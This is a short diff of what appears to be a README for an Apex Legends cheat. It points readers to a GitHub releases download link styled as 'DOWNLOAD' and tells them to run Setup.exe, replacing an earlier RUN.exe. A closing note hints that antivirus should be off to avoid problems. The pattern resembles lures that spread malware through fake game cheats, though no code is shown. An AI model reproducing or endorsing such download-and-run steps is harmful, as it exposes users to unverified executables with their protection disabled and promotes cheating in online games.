@@ -19,7 +19,7 @@
 ## How to run
 
 - # 🄳🄾🅆🄽🄻🄾🄰🄳: https://github.com/dinsherman202/solid-lamp/releases/tag/Download
-- Run - RUN.exe
+- Run - Setup.exe
 
 
 ## Note: Apex Legends Have "Easy Anti Cheat" and will ban your account if you use anticheat.soft or antivirus
